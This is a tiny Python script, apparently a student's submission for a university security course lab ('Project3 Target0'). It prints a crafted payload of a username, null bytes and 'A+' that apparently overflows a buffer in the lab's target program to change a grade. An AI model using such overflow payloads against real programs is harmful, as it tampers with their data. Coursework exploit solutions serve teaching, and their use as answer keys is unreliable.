#!/usr/bin/env python3

#Author: Tanner Bonds
#Date: 10/24/2020
#Dr. Drew Springall - COMP6370
#Project3 Target0

import sys

payload = b"tjb0057" + (b"\0" * 3) + b"A+"
sys.stdout.buffer.write(payload)
